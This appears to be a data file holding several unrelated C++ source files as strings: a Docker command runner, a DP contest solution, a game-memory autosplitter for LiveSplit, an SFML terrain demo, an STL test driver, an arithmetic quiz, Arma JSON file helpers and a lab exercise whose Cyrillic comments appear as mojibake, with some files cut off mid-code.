    "// main.cpp\r\n#include \"RunnerCore/DockerRunnerFactory.h\"\r\n#include \"RunnerCore/Runners/GoDockerRunner.h\"\r\n#include \"RunnerCore/Runners/NodeDockerRunner.h\"\r\n#include \"RunnerCore/Runners/Java/JavaDockerRunner.h\"\r\n#include \"RunnerCore/Runners/PythonDockerRunner.h\"\r\n#include \"RunnerCore/Runners/PHP/PhpDockerRunner.h\"\r\n#include \"RunnerCore/Runners/RustDockerRunner.h\"\r\n#include \"RunnerCore/Runners/CCppDockerRunner.h\"\r\n#include \"RunnerCore/Runners/PerlDockerRunner.h\"\r\n#include \"RunnerCore/Runners/RubyDockerRunner.h\"\r\n#include <string>\r\n#include <unistd.h>\r\n#include <memory>\r\n#include <vector>\r\n\r\n#define DOCKER_RUNNERS \\\r\n    X(GoDockerRunner) \\\r\n    X(NodeDockerRunner) \\\r\n    X(JavaDockerRunner) \\\r\n    X(PythonDockerRunner) \\\r\n    X(PhpDockerRunner) \\\r\n    X(RustDockerRunner) \\\r\n    X(CCppDockerRunner) \\\r\n    X(PerlDockerRunner) \\\r\n    X(RubyDockerRunner)\r\n\r\nnamespace {\r\n    #define X(runner) bool runner##Registered = (runner::registerRunner(), true);\r\n    DOCKER_RUNNERS\r\n    #undef X\r\n}\r\n\r\n// Function to parse all command-line options into a map, now using --rid:key=value format\r\nstd::map<std::string, std::string> parseOptions(int& argc, char* argv[]) {\r\n    std::map<std::string, std::string> options;\r\n\r\n    for (int i = 1; i < argc; ++i) {\r\n        std::string arg = argv[i];\r\n\r\n        // Look for options in the form --rid:key=value\r\n        if (arg.substr(0, 6) == \"--rid:\") {\r\n            size_t pos = arg.find(\"=\");\r\n            if (pos != std::string::npos) {\r\n                std::string key = arg.substr(6, pos - 6);   // Extract the key (without \"--rid:\")\r\n                std::string value = arg.substr(pos + 1);    // Extract the value\r\n                options[key] = value;\r\n\r\n                // Remove this option from argv\r\n                for (int j = i; j < argc - 1; ++j) {\r\n                    argv[j] = argv[j + 1];\r\n                }\r\n                --argc;\r\n                --i;\r\n            }\r\n        }\r\n    }\r\n\r\n    return options;\r\n}\r\n\r\n\r\nint main(int argc, char* argv[]) {\r\n    if (argc < 3) {\r\n        std::cerr << \"Usage: runindock <environment> <command...> [--image=<docker_image>] [--port=<container_port>]\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    // Parse all command-line options into a map\r\n    std::map<std::string, std::string> options = parseOptions(argc, argv);\r\n\r\n    // First argument is the environment (e.g., \"go\", \"node\", \"java\", \"javac\", ...)\r\n    std::string environment = argv[1];\r\n\r\n    // Collect all command-line arguments starting from the second one (i.e., argv[2]) into a single command string\r\n    std::string command;\r\n    for (int i = 1; i < argc; ++i) {  // Start from argv[2] to skip the environment\r\n        command += std::string(argv[i]) + \" \";\r\n    }\r\n\r\n    // Trim the trailing space from the command string\r\n    if (!command.empty()) {\r\n        command.pop_back();\r\n    }\r\n\r\n    // Get the appropriate DockerRunner based on the environment and custom image\r\n    auto dockerRunner = getDockerRunner(environment);\r\n    dockerRunner->setOptions(options);\r\n\r\n    // Run the provided command inside Docker\r\n    dockerRunner->run(command);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <bits/stdc++.h>\nusing namespace std;\nusing ll = long long;\nconst ll mod = 1e9 + 7;\nconst char nl = '\\n';\n\nvoid solve(){\n    int n, m, k;\n    cin >> n >> m >> k;\n    vector g(n, vector<ll>(n));\n    vector<ll> a(n);\n    for (int i = 0; i < n; ++i) {\n        cin >> a[i];\n    }\n    for (int i = 0; i < k; ++i) {\n        int u, v;\n        cin >> u >> v;\n        cin >> g[--u][--v];\n    }\n    vector dp(n, vector(1<<n, -1ll));\n    function<ll(int,int)> go = [&](int last, int mask) -> ll{\n        if (__popcount(mask) == m) return 0;\n        if (~dp[last][mask]) return dp[last][mask];\n        ll ans = 0;\n        for (int i = 0; i < n; ++i) {\n            if (mask&(1<<i)) continue;\n            ans = max(ans, a[i] + g[last][i] + go(i, mask | (1<<i)));\n        }\n        return dp[last][mask] = ans;\n    };\n    ll ans = 0;\n    for (int i = 0; i < n; ++i) {\n        ans = max(ans, a[i] + go(i,1<<i));\n    }\n    cout << ans <<nl;\n}\n\nint main() {\n    ios::sync_with_stdio(false);\n    cin.tie(nullptr);\n    solve();\n}",
    "#include \"includes.h\"\n#include \"readmem.h\"\n#include \"timercontrol.h\"\n#include <intrin.h>\n#include \"misc.h\"\n#include \"offsets.h\"\n#include \"panorama.h\"\n\nint main() {\n    setlocale(LC_ALL, \"ru\");\n\n    //getDemoPath();\n    const std::wstring processName = L\"revolution.exe\";\n\n    auto processID = GetProcessID(processName);\n    std::cout << \"Opening process handle...\";\n    while (processID == 0) {\n        processID = GetProcessID(processName);\n    }\n\n    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);\n    while (!processHandle) {\n        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);\n    }\n    std::cout << \"\\tDone!\\n\";\n\n    \n    std::cout << \"Initializing base address...\";\n    auto moduleBaseAddress = GetModuleBaseAddress(processID, L\"materialsystem.dll\");\n    while (moduleBaseAddress == 0) {\n        moduleBaseAddress = GetModuleBaseAddress(processID, L\"materialsystem.dll\");\n    }\n    auto engineBaseAddress = GetModuleBaseAddress(processID, L\"engine.dll\");\n    while (engineBaseAddress == 0) {\n        engineBaseAddress = GetModuleBaseAddress(processID, L\"engine.dll\");\n    }\n    auto clientBaseAddress = GetModuleBaseAddress(processID, L\"client.dll\");\n    while (clientBaseAddress == 0) {\n        clientBaseAddress = GetModuleBaseAddress(processID, L\"client.dll\");\n    }\n    auto panoramaBaseAddress = GetModuleBaseAddress(processID, L\"panorama.dll\");\n    while (panoramaBaseAddress == 0) {\n        panoramaBaseAddress = GetModuleBaseAddress(processID, L\"panorama.dll\");\n    }\n    auto gameoverlayrenderer64BaseAddress = GetModuleBaseAddress(processID, L\"gameoverlayrenderer64.dll\");\n    while (gameoverlayrenderer64BaseAddress == 0) {\n        gameoverlayrenderer64BaseAddress = GetModuleBaseAddress(processID, L\"gameoverlayrenderer64.dll\");\n    }\n    std::cout << \"\\tDone!\\n\";\n\n    std::cout << \"Offset address...\";\n    auto statusAddress = ResolvePointerChain(processHandle, moduleBaseAddress + 0x002DD420, statusOffsets);\n    while (statusAddress == 0) {\n        statusAddress = ResolvePointerChain(processHandle, moduleBaseAddress + 0x002DD420, statusOffsets);\n    }\n    uintptr_t mapAddress = engineBaseAddress + 0x01BEF900;\n    ReadProcessMemory(processHandle, (LPCVOID)mapAddress, &mapAddress, sizeof(mapAddress), nullptr);\n    mapAddress += 0x0;\n    uintptr_t bspAddress = engineBaseAddress + 0x1AD7E05; // bsp map string type adress\n    uintptr_t endAddress = clientBaseAddress + 0x1A4BDA2C; // or +0x1A4BDA30 or  +0x1A4BDA34 (they are the same)\n    std::cout << \"\\t\\tDone!\\n\";\n\n    ServerSplitter::Timer timer(TIMER_NOINIT);\n\n    std::cout << \"Connecting to LiveSplit...\";\n    //timer = ServerSplitter::createTimer(CATCH_CONSOLE_DEBUG); // CATCH_CONSOLE_DEBUG if wanna see console output\n    std::cout << \"\\tDone!\\n\";\n\n    std::cout << \"*Status address: \" << std::hex << statusAddress << std::dec << std::endl;\n    std::cout << \"*Map address: \" << std::hex << mapAddress << std::dec << std::endl;\n\n    std::thread loglabelThread(start_loglabel, processHandle, panoramaBaseAddress, (LPCVOID)mapAddress, std::ref(timer));\n    loglabelThread.detach();\n\n    //editMainMenu(processHandle, panoramaBaseAddress , gameoverlayrenderer64BaseAddress);\n    monitorReset(processHandle, (LPCVOID)statusAddress, (LPCVOID)mapAddress, (LPCVOID)bspAddress, (LPCVOID)endAddress, timer);\n\n    CloseHandle(processHandle);\n\n    return 0;\n}\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#define STB_PERLIN_IMPLEMENTATION\n#include \"stb_perlin.h\"\n#include <SFML/Graphics.hpp>\n#include <vector>\n#include <deque>\n#include <sstream>\n#include <algorithm>\n#include <cstring>\n#include <cmath>\n\n\nnamespace\n{\n    // Width and height of the application window\n    const unsigned int windowWidth = 800;\n    const unsigned int windowHeight = 600;\n\n    // Resolution of the generated terrain\n    const unsigned int resolutionX = 800;\n    const unsigned int resolutionY = 600;\n\n    // Thread pool parameters\n    const unsigned int threadCount = 4;\n    const unsigned int blockCount = 32;\n\n    struct WorkItem\n    {\n        sf::Vertex* targetBuffer;\n        unsigned int index;\n    };\n\n    std::deque<WorkItem> workQueue;\n    std::vector<sf::Thread*> threads;\n    int pendingWorkCount = 0;\n    bool workPending = true;\n    bool bufferUploadPending = false;\n    sf::Mutex workQueueMutex;\n\n    struct Setting\n    {\n        const char* name;\n        float* value;\n    };\n\n    // Terrain noise parameters\n    const int perlinOctaves = 3;\n\n    float perlinFrequency = 7.0f;\n    float perlinFrequencyBase = 4.0f;\n\n    // Terrain generation parameters\n    float heightBase = 0.0f;\n    float edgeFactor = 0.9f;\n    float edgeDropoffExponent = 1.5f;\n\n    float snowcapHeight = 0.6f;\n\n    // Terrain lighting parameters\n    float heightFactor = windowHeight / 2.0f;\n    float heightFlatten = 3.0f;\n    float lightFactor = 0.7f;\n}\n\n\n// Forward declarations of the functions we define further down\nvoid threadFunction();\nvoid generateTerrain(sf::Vertex* vertexBuffer);\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    // Create the window of the application\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"SFML Island\",\n                            sf::Style::Titlebar | sf::Style::Close);\n    window.setVerticalSyncEnabled(true);\n\n    sf::Font font;\n    if (!font.loadFromFile(\"resources/sansation.ttf\"))\n        return EXIT_FAILURE;\n\n    // Create all of our graphics resources\n    sf::Text hudText;\n    sf::Text statusText;\n    sf::Shader terrainShader;\n    sf::RenderStates terrainStates(&terrainShader);\n    sf::VertexBuffer terrain(sf::Triangles, sf::VertexBuffer::Static);\n\n    // Set up our text drawables\n    statusText.setFont(font);\n    statusText.setCharacterSize(28);\n    statusText.setFillColor(sf::Color::White);\n    statusText.setOutlineColor(sf::Color::Black);\n    statusText.setOutlineThickness(2.0f);\n\n    hudText.setFont(font);\n    hudText.setCharacterSize(14);\n    hudText.setFillColor(sf::Color::White);\n    hudText.setOutlineColor(sf::Color::Black);\n    hudText.setOutlineThickness(2.0f);\n    hudText.setPosition(5.0f, 5.0f);\n\n    // Staging buffer for our terrain data that we will upload to our VertexBuffer\n    std::vector<sf::Vertex> terrainStagingBuffer;\n\n    // Check whether the prerequisites are suppprted\n    bool prerequisitesSupported = sf::VertexBuffer::isAvailable() && sf::Shader::isAvailable();\n\n    // Set up our graphics resources and set the status text accordingly\n    if (!prerequisitesSupported)\n    {\n        statusText.setString(\"Shaders and/or Vertex Buffers Unsupported\");\n    }\n    else if (!terrainShader.loadFromFile(\"resources/terrain.vert\", \"resources/terrain.frag\"))\n    {\n        prerequisitesSupported = false;\n\n        statusText.setString(\"Failed to load shader program\");\n    }\n    else\n    {\n        // Start up our thread pool\n        for (unsigned int i = 0; i < threadCount; i++)\n        {\n            threads.push_back(new sf::Thread(threadFunction));\n            threads.back()->launch();\n        }\n\n        // Create our VertexBuffer with enough space to hold all the terrain geometry\n        terrain.create(resolutionX * resolutionY * 6);\n\n        // Resize the staging buffer to be able to hold all the terrain geometry\n        terrainStagingBuffer.resize(resolutionX * resolutionY * 6);\n\n        // Generate the initial terrain\n        generateTerrain(&terrainStagingBuffer[0]);\n\n        statusText.setString(\"Generating Terrain...\");\n    }\n\n    // Center the status text\n    statusText.setPosition((windowWidth - statusText.getLocalBounds().width) / 2.f, (windowHeight - statusText.getLocalBounds().height) / 2.f);\n\n    // Set up an array of pointers to our settings for arrow navigation\n    Setting settings[] =\n    {\n        {\"perlinFrequency\",     &perlinFrequency},\n        {\"perlinFrequencyBase\", &perlinFrequencyBase},\n        {\"heightBase\",          &heightBase},\n        {\"edgeFactor\",          &edgeFactor},\n        {\"edgeDropoffExponent\", &edgeDropoffExponent},\n        {\"snowcapHeight\",       &snowcapHeight},\n        {\"heightFactor\",        &heightFactor},\n        {\"heightFlatten\",       &heightFlatten},\n      ",
    "\ufeff#ifdef _MSC_VER\r\n#define _SCL_SECURE_NO_WARNINGS\r\n#endif\r\n\r\n#if defined(_MSC_VER) && defined(_DEBUG)\r\n#define _CRTDBG_MAP_ALLOC \r\n#include <stdlib.h>\r\n#include <crtdbg.h>\r\n#endif // check memory leaks\r\n\r\n#include \"algorithm_performance_test.h\"\r\n#include \"algorithm_test.h\"\r\n#include \"vector_test.h\"\r\n#include \"list_test.h\"\r\n#include \"deque_test.h\"\r\n#include \"queue_test.h\"\r\n#include \"stack_test.h\"\r\n#include \"map_test.h\"\r\n#include \"set_test.h\"\r\n#include \"unordered_map_test.h\"\r\n#include \"unordered_set_test.h\"\r\n#include \"string_test.h\"\r\n\r\nint main()\r\n{\r\n  using namespace mystl::test;\r\n\r\n  std::cout.sync_with_stdio(false);\r\n\r\n  RUN_ALL_TESTS();\r\n  algorithm_performance_test::algorithm_performance_test();\r\n  vector_test::vector_test();\r\n  list_test::list_test();\r\n  deque_test::deque_test();\r\n  queue_test::queue_test();\r\n  queue_test::priority_test();\r\n  stack_test::stack_test();\r\n  map_test::map_test();\r\n  map_test::multimap_test();\r\n  set_test::set_test();\r\n  set_test::multiset_test();\r\n  unordered_map_test::unordered_map_test();\r\n  unordered_map_test::unordered_multimap_test();\r\n  unordered_set_test::unordered_set_test();\r\n  unordered_set_test::unordered_multiset_test();\r\n  string_test::string_test();\r\n\r\n#if defined(_MSC_VER) && defined(_DEBUG)\r\n  _CrtDumpMemoryLeaks();\r\n#endif // check memory leaks\r\n\r\n}\r\n",
    "\r\n#include <iostream>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\n\r\nenum enQuestionsLevel { EasyLevel = 1, MedLevel = 2, HardLevel = 3, Mix = 4};\r\nenum enOperationType { Add = 1, Sub = 2, Mult = 3, Div = 4, MixOp = 5};\r\n\r\nstring GetOpTypeSymbol(enOperationType OpType)\r\n{\r\n\tswitch (OpType)\r\n\t{\r\n\tcase enOperationType::Add:\r\n\t\treturn \"+\";\r\n\tcase enOperationType::Sub:\r\n\t\treturn \"-\";\r\n\tcase enOperationType::Mult:\r\n\t\treturn \"x\";\r\n\tcase enOperationType::Div:\r\n\t\treturn \"/\";\r\n\tdefault:\r\n\t\treturn \"Mix\";\r\n\t}\r\n}\r\n\r\nstring GetQuestionLevelText(enQuestionsLevel QuestionLevel)\r\n{\r\n\tstring arrQuestionString[4] = { \"Easy\", \"Med\", \"Hard\", \"Mix\" };\r\n\treturn arrQuestionString[QuestionLevel - 1];\r\n}\r\n\r\nint RandomNumber(int From, int To)\r\n{\r\n\tint randNum = rand() % (To - From + 1) + From;\r\n\r\n\treturn randNum;\r\n}\r\n\r\nvoid SetScreenColor(bool Right)\r\n{\r\n\tif (Right)\r\n\t\tsystem(\"color 2F\");\r\n\telse\r\n\t{\r\n\t\tsystem(\"color 4F\");\r\n\t\tcout << \"\\a\";\r\n\t}\r\n}\r\n\r\nshort ReadHowManyQuestions()\r\n{\r\n\tshort NumberOfQuestions;\r\n\tdo {\r\n\t\tcout << \"How Many Questions do you want to answer ? \";\r\n\t\tcin >> NumberOfQuestions;\r\n\t} while (NumberOfQuestions < 0 || NumberOfQuestions > 10);\r\n\r\n\treturn NumberOfQuestions;\r\n}\r\n\r\nenQuestionsLevel ReadQuestionsLevel()\r\n{\r\n\tshort QuestionLevel = 0;\r\n\tdo\r\n\t{\r\n\t\tcout << \"Enter Questions Level [1] Easy, [2] Med, [3] Hard, [4] Mix ? \";\r\n\t\tcin >> QuestionLevel;\r\n\t} while (QuestionLevel < 0 || QuestionLevel > 4);\r\n\r\n\treturn (enQuestionsLevel) QuestionLevel;\r\n}\r\n\r\nenOperationType ReadOpType()\r\n{\r\n\tint Optype;\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"Enter Operation Type [1] Add, [2] Sub, [3] Mul, [4] Div, [5] Mix ? \";\r\n\t\tcin >> Optype;\r\n\t} while (Optype < 0 || Optype > 6);\r\n\r\n\treturn (enOperationType) Optype;\r\n}\r\n\r\nstruct stQuestion\r\n{\r\n\tint Number1 = 0;\r\n\tint Number2 = 0;\r\n\tenOperationType OperationType;\r\n\tenQuestionsLevel QuestionLevel;\r\n\tint CorrectAnswer = 0;\r\n\tint PlayerAnswer = 0;\r\n\tbool AnswerResult = false;\r\n};\r\n\r\nstruct stQuizz\r\n{\r\n\tstQuestion QuestionList[100];\r\n\tshort NumberOfQuestions;\r\n\tenQuestionsLevel QuestionsLevel;\r\n\tenOperationType OpType;\r\n\tshort NumberOfWrongAnswers = 0;\r\n\tshort NumberOfRightAnswers = 0;\r\n\tbool isPass = false;\r\n};\r\n\r\nint SimpleCalculator(short Number1, short Number2, enOperationType Optype)\r\n{\r\n\tswitch (Optype)\r\n\t{\r\n\tcase enOperationType::Add:\r\n\t\treturn Number1 + Number2;\r\n\tcase enOperationType::Sub:\r\n\t\treturn Number1 - Number2;\r\n\tcase enOperationType::Mult:\r\n\t\treturn Number1 * Number2;\r\n\tcase enOperationType::Div:\r\n\t\treturn Number1 / Number2;\r\n\tdefault:\r\n\t\treturn Number1 + Number2;\r\n\t}\r\n}\r\n\r\nenOperationType GetRandomOperationType()\r\n{\r\n\tint Op = RandomNumber(1, 4);\r\n\treturn (enOperationType)Op;\r\n}\r\n\r\nstQuestion GenerateQuestion(enQuestionsLevel QuestionLevel, enOperationType OpType)\r\n{\r\n\tstQuestion Question;\r\n\r\n\tif (QuestionLevel == enQuestionsLevel::Mix)\r\n\t{\r\n\t\tQuestionLevel = (enQuestionsLevel)RandomNumber(1, 3);\r\n\t}\r\n\r\n\tif (OpType == enOperationType::MixOp)\r\n\t{\r\n\t\tOpType = GetRandomOperationType();\r\n\t}\r\n\r\n\tQuestion.OperationType = OpType;\r\n\r\n\tswitch (QuestionLevel)\r\n\t{\r\n\tcase enQuestionsLevel::EasyLevel:\r\n\t\tQuestion.Number1 = RandomNumber(1, 10);\r\n\t\tQuestion.Number2 = RandomNumber(1, 10);\r\n\r\n\t\tQuestion.CorrectAnswer = SimpleCalculator(Question.Number1, Question.Number2, Question.OperationType);\r\n\t\tQuestion.QuestionLevel = QuestionLevel;\r\n\t\treturn Question;\r\n\r\n\tcase enQuestionsLevel::MedLevel:\r\n\t\tQuestion.Number1 = RandomNumber(10, 50);\r\n\t\tQuestion.Number2 = RandomNumber(10, 50);\r\n\t\t\r\n\t\tQuestion.CorrectAnswer = SimpleCalculator(Question.Number1, Question.Number2, Question.OperationType);\r\n\t\tQuestion.QuestionLevel = QuestionLevel;\r\n\t\treturn Question;\r\n\t\t\r\n\tcase enQuestionsLevel::HardLevel:\r\n\t\tQuestion.Number1 = RandomNumber(50, 100);\r\n\t\tQuestion.Number2 = RandomNumber(50, 100);\r\n\r\n\t\tQuestion.CorrectAnswer = SimpleCalculator(Question.Number1, Question.Number2, Question.OperationType);\r\n\t\tQuestion.QuestionLevel = QuestionLevel;\r\n\t\treturn Question;\r\n\t}\r\n\r\n\treturn Question;\r\n}\r\n\r\nvoid GenerateQuizzQuestions(stQuizz& Quizz)\r\n{\r\n\tfor (short Question = 0; Question < Quizz.NumberOfQuestions; Question++)\r\n\t{\r\n\t\tQuizz.QuestionList[Question] = GenerateQuestion(Quizz.QuestionsLevel, Quizz.OpType);\r\n\t}\r\n}\r\n\r\nint ReadQuestionAnswer()\r\n{\r\n\tint Answer = 0;\r\n\tcin >> Answer;\r\n\treturn Answer;\r\n}\r\n\r\nvoid PrintTheQuestion(stQuizz& Quizz, short QuestionNumber)\r\n{\r\n\tcout << \"\\n\";\r\n\tcout << \"Question [\" << QuestionNumber + 1 << \"/\" << Quizz.NumberOfQuestions << \"] \\n\\n\";\r\n\tcout << Quizz.QuestionList[QuestionNumber].Number1 << endl;\r\n\tcout << Quizz.QuestionList[QuestionNumber].Number2 << \" \";\r\n\tcout << GetOpTypeSymbol(Quizz.QuestionList[QuestionNumber].OperationType) << endl;\r\n\tcout << \"\\n_____________\" << endl;\r\n\r\n}\r\n\r\nvoid CorrectTheQuestionAnswer(stQuizz& Quizz, short QuestionNumber)\r\n{\r\n\tif (Quizz.QuestionList[QuestionNumber].PlayerAnswer != Quizz.QuestionList[QuestionNumber].CorrectAnswer)\r\n\t{\r\n\t\tQuizz.QuestionList[QuestionNumber].AnswerResult = false;\r\n\t\tQuizz.NumberOfWrongAnswers++;\r\n\r\n\t\tcout << \"Wrong Answer :-(\\n\";\r\n\t\tcout",
    "#include \"armaFileFunctions.hpp\"\r\n#include <nlohmann/json.hpp>\r\n#include <boost/date_time.hpp>\r\n#include <thread>\r\n#include <future>\r\n\r\nusing JSON = nlohmann::json;\r\nnamespace arma {\r\n\r\n\tString getCurrentDateTime() {\r\n\r\n\t\tstd::ostringstream ss;\r\n\t\tboost::posix_time::ptime time{ boost::posix_time::second_clock::local_time() };\r\n\r\n\t\tauto time_facet = new boost::posix_time::time_facet{ \"%d-%m-%Y %H-%M\" };\r\n\t\tss.imbue(std::locale(ss.getloc(), time_facet));\r\n\t\tss << time;\r\n\r\n\t\treturn ss.str();\r\n\t}\r\n\r\n\tString copyFile(const fs::path filePath) {\r\n\r\n\t\tString filePathFull = filePath.filename().string(); //Get the name portion without the timestamp from file\r\n\t\tString name;\r\n\t\tstd::stringstream ss;\r\n\t\tss << filePathFull;  \r\n\t\tss >> name; //terminates extraction once whitespace is reached\r\n\t\tString backupSuffix{ name + \" (\" + getCurrentDateTime() + \").JSON\" };\r\n\t\tfs::path backupFilePath{ fs::current_path() / \"JSON\" / backupSuffix };\r\n\r\n\t\tbool hasCopied = false;\r\n\t\ttry {\r\n\t\t\thasCopied = fs::copy_file(filePath, backupFilePath, fs::copy_options::overwrite_existing);\r\n\t\t}\r\n\t\tcatch (std::exception& e) {\r\n\t\t\treturn e.what();\r\n\t\t}\r\n\t\r\n\t\tString out{ fs::absolute(filePath).string() };\r\n\t\tif (hasCopied) {\r\n\t\t\tout += \"<br/>A copy has been made: \" + backupFilePath.filename().string() + \"<br/>\"; // <br/> will be used by Arma formatText\r\n\t\t}\r\n\t\telse {\r\n\t\t\tout += \"<br/>No copy could be made.<br/>\";\r\n\t\t}\r\n\r\n\t\treturn out;\r\n\t}\r\n\r\n\r\n\tString writeFile(const char* function) {\r\n\t\tString fileNameFull;\r\n\t\tJSON json;\r\n\r\n\t\ttry {\r\n\t\t\tstd::stringstream ss;\r\n\t\t\tss << function; //btc_hm_${worldName} ${JSON}\r\n\t\t\tss >> fileNameFull >> json;\r\n\r\n\t\t\tif (fileNameFull.empty()) {\r\n\t\t\t\tthrow std::invalid_argument(\"invalid file name\");\r\n\t\t\t}\r\n\r\n\t\t\tfileNameFull += \" (\" + getCurrentDateTime() + \").JSON\" ;\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\treturn e.what();\r\n\t\t}\r\n\r\n\t\tstd::promise<bool> p;\r\n\t\tstd::future<bool> f{ p.get_future() };\r\n\t\tstd::filesystem::path filePath{ fs::current_path() / \"JSON\" / fileNameFull};\r\n\r\n\t\tstd::thread thread1([&]() {\r\n\t\t\tif (!fs::exists(filePath.parent_path())) {\r\n\t\t\t\tfs::create_directories(filePath.parent_path());\r\n\t\t\t}\r\n\t\t\tstd::ofstream jsonFile{ filePath };\r\n\t\t\tif (jsonFile) {\r\n\t\t\t\tjsonFile << std::setw(4) << json;\r\n\t\t\t\tjsonFile.close();\r\n\r\n\t\t\t\tp.set_value_at_thread_exit(!(jsonFile.is_open()));\r\n\t\t\t}\r\n\t\t\t});\r\n\t\tthread1.detach();\r\n\r\n\t\tbool hasWrittenToFile{ f.get() };\r\n\r\n\t\tif (hasWrittenToFile) {\r\n\t\t\treturn filePath.string();\r\n\t\t}\r\n\t\telse {\r\n\t\t\treturn \"\";\r\n\t\t}\r\n\t}\r\n\r\n\tconst String retrieveList() {\r\n\t\tconst std::filesystem::path filePath{ fs::current_path() / \"JSON\" };\r\n\t\tif(!fs::exists(filePath)) {\r\n\t\t\tfs::create_directories(filePath);\r\n\t\t}\r\n\t\tconst fs::directory_iterator dir{ filePath };\r\n\t\tstd::vector<String> vecDirs;\r\n\r\n\t\ttry {\r\n\t\t\tfor (const auto& p : dir) {\r\n\t\t\t\tconst String ext{ p.path().extension().string() };\r\n\t\t\t\tif (ext == \".JSON\") {\r\n\t\t\t\t\tvecDirs.push_back(fs::absolute(p.path()).string());\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\treturn e.what();\r\n\t\t}\r\n\r\n\r\n\t\treturn to_string(vecDirs);\r\n\t}\r\n\r\n\r\n\tString to_string(const std::vector<String>& vec) {\r\n\t\tstd::stringstream ss;\r\n\t\tss << \"[\";\r\n\t\tfor (const auto& el : vec) {\r\n\t\t\tss << R\"(\")\" << el << R\"(\")\" << (el != vec.back() ? \", \" : \"\"); // [\"ELEMENT1\", \"ELEMENT2\",...]\r\n\t\t}\r\n\t\tss << \"]\";\r\n\r\n\t\treturn ss.str();\r\n\t}\r\n\r\n\tString deleteFile(const fs::path filePath) {\r\n\t\tString fileNameFull{ filePath.filename().string() };\r\n\r\n\t\ttry {\r\n\t\t\tfs::remove(filePath);\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\treturn e.what();\r\n\t\t}\r\n\r\n\t\treturn fileNameFull + \" has been deleted\";\r\n\t}\r\n\r\n\tString renameFile(const fs::path filePath, String name) {\r\n\t\tname += \" (\" + getCurrentDateTime() + \").JSON\";\r\n\r\n\t\tfs::path newFilePath{ fs::current_path() / \"JSON\" / name };\r\n\r\n\t\ttry {\r\n\t\t\tfs::rename(filePath, newFilePath);\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\treturn e.what();\r\n\t\t}\r\n\t\t\r\n\t\treturn fs::absolute(newFilePath).string();\r\n\t}\r\n\r\n}",
    "// Lab_03_2.cpp\n// < \u010f\u0111\u0142\u00e7\u00e2\u010d\u016f\u013a, \u0142\u011b\u2019\u02d9 \u0155\u00e2\u0148\u00ee\u0111\u0155 >\n// \u00cb\u0155\u00e1\u00ee\u0111\u0155\u0148\u00ee\u0111\u00ed\u0155 \u0111\u00ee\u00e1\u00ee\u0148\u0155 \u0105 3.2\n// \u0110\u00ee\u00e7\u0103\u0155\u00eb\u00f3\u0107\u013a\u00ed\u00ed\u02d9, \u00e7\u0155\u00e4\u0155\u00ed\u013a \u00f4\u00ee\u0111\u011b\u00f3\u00eb\u00ee\u0163: \u00f4\u00f3\u00ed\u0119\u00f6\u0142\u02d9 \u00e7 \u010f\u0155\u0111\u0155\u011b\u013a\u0148\u0111\u0155\u011b\u010d.\n// \u00c2\u0155\u0111\u0142\u0155\u00ed\u0148 4\n#include <iostream>\nusing namespace std;\nint main()\n{\n\tdouble x; // \u00e2\u0151\u0142\u00e4\u00ed\u010d\u00e9 \u0155\u0111\u0103\u00f3\u011b\u013a\u00ed\u0148\n\tdouble a; // \u00e2\u0151\u0142\u00e4\u00ed\u010d\u00e9 \u010f\u0155\u0111\u0155\u011b\u013a\u0148\u0111\n\tdouble b; // \u00e2\u0151\u0142\u00e4\u00ed\u010d\u00e9 \u010f\u0155\u0111\u0155\u011b\u013a\u0148\u0111\n\tdouble c; // \u00e2\u0151\u0142\u00e4\u00ed\u010d\u00e9 \u010f\u0155\u0111\u0155\u011b\u013a\u0148\u0111\n\tdouble F; // \u0111\u013a\u00e7\u00f3\u00eb\u00fc\u0148\u0155\u0148 \u00ee\u00e1\u00f7\u010d\u0144\u00eb\u013a\u00ed\u00ed\u02d9 \u00e2\u010d\u0111\u0155\u00e7\u00f3\n\tcout << \"a = \"; cin >> a;\n\tcout << \"b = \"; cin >> b;\n\tcout << \"c = \"; cin >> c;\n\t\tcout << \"x = \"; cin >> x;\n\t// \u0144\u010f\u00ee\u0144\u0142\u00e1 1: \u0111\u00ee\u00e7\u0103\u0155\u00eb\u00f3\u0107\u013a\u00ed\u00ed\u02d9 \u00e2 \u0144\u0119\u00ee\u0111\u00ee\u00f7\u013a\u00ed\u0142\u00e9 \u00f4\u00ee\u0111\u011b\u0142\n\tif (c < 0 && b != 0)\n\t\tF = (-a * x - c);\n\tif (c > 0 && x == 0)\n\t\tF = (x - a) / (-c);\n\tif (!(c < 0 && b != 0) && !(c > 0 && x == 0))\n\t\tF = (b * x) / (c - a); \n\tcout << endl;\n\tcout << \"1) F = \" << F << endl;\n//  \u0144\u010f\u00ee\u0144\u0142\u00e1 2: \u0111\u00ee\u00e7\u0103\u0155\u00eb\u00f3\u0107\u013a\u00ed\u00ed\u02d9 \u00e2 \u010f\u00ee\u00e2\u00ed\u0142\u00e9 \u00f4\u00ee\u0111\u011b\u0142\n\tif (c < 0 && b != 0)\n\t\tF = (-a * x - c);\n\telse\n\t\tif (c > 0 && x == 0)\n\t\t\tF = (x - a) / (-c);\n\t\telse \n\t\t\tif (!(c < 0 && b != 0) && !(c > 0 && x == 0)) \n\t\t\t\tF = (b * x) / (c - a); \n\tcout << \"2) F = \" << F << endl;\n\tcin.get();\n\treturn 0;\n}\n",
